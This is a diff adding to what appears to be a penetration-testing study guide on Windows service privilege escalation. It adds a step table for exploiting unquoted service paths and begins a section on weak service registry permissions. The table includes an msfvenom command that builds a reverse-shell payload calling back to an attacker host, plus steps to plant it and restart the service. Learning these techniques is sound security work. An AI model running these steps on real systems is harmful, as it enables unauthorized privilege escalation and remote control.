@@ -248,3 +248,31 @@ net start unquotedsvc
 ```
 
 **Alternative:** Wait for system reboot (if service is AUTO_START)
+
+## Summary
+
+| Step | Command | Purpose |
+|---|---|---|
+| 1. Find unquoted paths | `wmic service get name,pathname,startmode \| findstr /i /v """"` | Lists services without quotes |
+| 2. Check service details | `sc qc <service>` | Shows full path & privileges |
+| 3. Check write permissions | `accesschk.exe -uwdq "<path>"` | Check if you can write to the folder |
+| 4. Create payload | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o exploit.exe` | Creates malicious EXE payload |
+| 5. Upload to path | `copy exploit.exe "C:\Program Files\Target.exe"` | Place payload in exploitable location |
+| 6. Restart service | `net stop <service> & net start <service>` | Triggers payload execution |
+
+
+___
+
+#  03: Service Exploits - Weak Registry Permissions
+
+Windows Registry = Database that stores system settings
+
+Service settings stored in:
+
+```
+HKLM\System\CurrentControlSet\Services\<ServiceName>
+```
+
+**The Problem:**
+If you can modify the registry key for a service, you can change what executable it runs!
+
